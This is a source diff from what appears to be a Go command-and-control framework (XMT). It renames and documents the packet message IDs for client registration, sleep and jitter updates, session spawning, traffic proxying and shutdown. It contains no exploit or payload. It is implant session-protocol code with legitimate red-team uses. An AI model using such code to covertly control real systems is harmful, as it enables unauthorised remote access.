@@ -10,7 +10,6 @@ import (
 	"time"
 
 	"github.com/PurpleSec/logx"
-	"github.com/iDigitalFlame/xmt/c2/task"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/com/limits"
 	"github.com/iDigitalFlame/xmt/data"
@@ -18,33 +17,56 @@ import (
 	"github.com/iDigitalFlame/xmt/util"
 )
 
-// Packet Message Constants for Handeling and Management.
+// Message ID Values are a byte value from 0 to 255 (uint8).
+//
+// This value will assist in determining the action of the specified value.
+// Values under 20 (<20) are considered system ID values and are used for controlling the Client session and
+// invoking system specific functions. System functions are handled directly by the Session thread to prevent any lagtime
+// during processing. Many system functions do not have a return.
+//
+// Custom Message ID Values are defined in the "task" package.
+//
+// Message ID Value Mappings
+//
+// MvInvalid  -  0: Invalid ID value. This value is always zero and is used to detect corrupted or invalid data.
+// MvNop      -  1: Instructs the server or client to wait until the next wakeup as there is no data to return.
+// MvHello    -  2: Initial ID value to send to the server as a client to begin the registration process. By design, this
+//                  Packet should contain the device information struct.
+// MvError    -  7: Used to inform that the Job ID that this Packet contains resulted in an error. By design, this Packet
+//                  should contain a string value that describes the error.
+// MvSpawn    - 17: Instructs the client Session to spawn a separate and independent Session from the current one. By design,
+//                  this Packet payload should include an address to connect to and an optional Profile struct. If the Profile
+//                  struct is not provided, the new Session will use the current Profile.
+// MvProxy    - 18: Instructs the client to open a new Listener to proxy traffic from other clients to the server. By design,
+//                  the Packet payload should include a listening address and a Profile struct. These options will specify
+//                  the listening Proxy type and Profile used.
+// MvResult   - 20: The first non-system ID value. This is used to respond to any Tasks issued with the payload of the
+//                  Packet containing the Task result output.
+// MvUpdate   -  6: Instructs the client to update it's time/jitter settings from the server. This Packet should contain
+//                  an uint8 (jitter) and a uint64 (sleep) in the payload. This has no effect on the server.
+// MvRegister -  3: Sent by the server to a client when a client attempts to communicate to a server that it has not
+//                  previously registered with. By design, the client should re-invoke the MvHello packet with the device
+//                  information to establish a proper connection to the target server.
+// MvComplete -  4: Response by the server when a client issues a MvHello packet. This indicates that registration is
+//                  successful and the client may start the standard communication protocol.
+// MvShutdown -  5: Indicates shutdown by the server or client. If sent by the client, the server will remove the client
+//                  Session from its database on the next cycle. If sent by the server, this instructs the client process
+//                  to stop working and perform cleanup functions.
+// MvMultiple - 19: Indicates that the Packet payload contains multiple separate Packets. This also indicates to the Packet
+//                  reader that the Frag settings on the Packet should be read as Multi-Packet length and size values instead.
 const (
-	MsgPing     = 0xFE00
-	MsgSleep    = 0xFE01
-	MsgMultiple = 0xFE02
-)
-
-// Packet Message Constants for Error Message and Sessions.
-const (
-	MsgError      = 0xFEEF
-	MsgHello      = 0xFA00
-	MsgProfile    = 0xFA04
-	MsgRegister   = 0xFA01
-	MsgShutdown   = 0xFA03
-	MsgRegistered = 0xFA02
-)
-
-// Packet Message Constants for Tasking and Actions.
-const (
-	MsgCode     = uint16(task.TaskCode)
-	MsgSpawn    = 0xBA04
-	MsgProxy    = 0xBA05
-	MsgResult   = 0xBB00
-	MsgUpload   = uint16(task.TaskUpload)
-	MsgRefresh  = uint16(task.TaskRefresh)
-	MsgProcess  = uint16(task.TaskProcess)
-	MsgDownload = uint16(task.TaskDownload)
+	MvInvalid  uint8 = 0x00
+	MvNop      uint8 = 0x01
+	MvHello    uint8 = 0x02
+	MvError    uint8 = 0x07
+	MvSpawn    uint8 = 0x11
+	MvProxy    uint8 = 0x12
+	MvResult   uint8 = 0x14
+	MvUpdate   uint8 = 0x06
+	MvRegister uint8 = 0x03
+	MvComplete uint8 = 0x04
+	MvShutdown uint8 = 0x05
+	MvMultiple uint8 = 0x13
 )
 
 var (
@@ -129,7 +151,7 @@ func notify(l *Listener, s *Session, p *com.Packet) error {
 		if s.swarm != nil && s.swarm.accept(p) {
 			return nil
 		}
-		if p.ID == MsgRegister {
+		if p.ID == MvRegister {
 			p.Device = s.Device.ID
 		} else {
 			return fmt.Errorf("received a Packet ID %q that does not match our own ID %q", p.ID, s.ID)
@@ -146,11 +168,8 @@ func notify(l *Listener, s *Session, p *com.Packet) error {
 	if s == nil {
 		return nil
 	}
-	switch p.ID {
-	case MsgPing, MsgHello, MsgSleep:
-		if p.Flags&com.FlagData == 0 {
-			return nil
-		}
+	if p.ID <= MvHello && p.Flags&com.FlagData == 0 {
+		return nil
 	}
 	switch {
 	case p.Flags&com.FlagData != 0 && p.Flags&com.FlagMulti == 0 && p.Flags&com.FlagFrag == 0:
@@ -206,7 +225,7 @@ func notify(l *Listener, s *Session, p *com.Packet) error {
 func notifyClient(l *Listener, s *Session, p *com.Packet) {
 	if s != nil {
 		switch p.ID {
-		case MsgProfile:
+		case MvUpdate:
 			if j, err := p.Uint8(); err == nil && j <= 100 {
 				s.jitter = j
 			}
@@ -217,10 +236,10 @@ func notifyClient(l *Listener, s *Session, p *com.Packet) {
 			if p.Flags&com.FlagData == 0 {
 				return
 			}
-		case MsgShutdown:
+		case MvShutdown:
 			if s.parent != nil {
 				s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
-				s.Write(&com.Packet{ID: MsgShutdown, Job: 1})
+				s.Write(&com.Packet{ID: MvShutdown, Job: 1})
 			} else {
 				if s.done > flagOpen {
 					return
@@ -229,13 +248,13 @@ func notifyClient(l *Listener, s *Session, p *com.Packet) {
 			}
 			s.Close()
 			return
-		case MsgRegister:
+		case MvRegister:
 			if s.swarm != nil {
 				for _, v := range s.swarm.clients {
-					v.send <- &com.Packet{ID: MsgRegister, Job: uint16(util.Rand.Uint32())}
+					v.send <- &com.Packet{ID: MvRegister, Job: uint16(util.Rand.Uint32())}
 				}
 			}
-			n := &com.Packet{ID: MsgHello, Job: uint16(util.Rand.Uint32())}
+			n := &com.Packet{ID: MvHello, Job: uint16(util.Rand.Uint32())}
 			device.Local.MarshalStream(n)
 			n.Close()
 			s.send <- n
@@ -257,7 +276,7 @@ func notifyClient(l *Listener, s *Session, p *com.Packet) {
 		l.s.events <- event{s: s, p: p, pFunc: s.Receive}
 	}
 	if len(s.recv) == cap(s.recv) {
-		// Clear the buffer of the last Packet as we don't want to block
+		// INFO: Clear the buffer of the last Packet as we don't want to block
 		<-s.recv
 	}
 	s.recv <- p
@@ -395,7 +414,7 @@ func nextPacket(c chan *com.Packet, p *com.Packet, i device.ID) (*com.Packet, *c
 			continue
 		}
 		if w == nil {
-			w = &com.Packet{ID: MsgMultiple, Device: i, Flags: com.FlagMulti}
+			w = &com.Packet{ID: MvMultiple, Device: i, Flags: com.FlagMulti}
 			if x != nil {
 				w.Tags, x.Tags = x.Tags, nil
 				if x.MarshalStream(w); x.Flags&com.FlagChannel != 0 {
@@ -414,7 +433,7 @@ func nextPacket(c chan *com.Packet, p *com.Packet, i device.ID) (*com.Packet, *c
 	}
 	if !a {
 		m, t = true, t+1
-		(&com.Packet{ID: MsgPing, Device: i}).MarshalStream(w)
+		(&com.Packet{ID: MvNop, Device: i}).MarshalStream(w)
 	}
 	if w.Close(); m {
 		w.Flags |= com.FlagMultiDevice
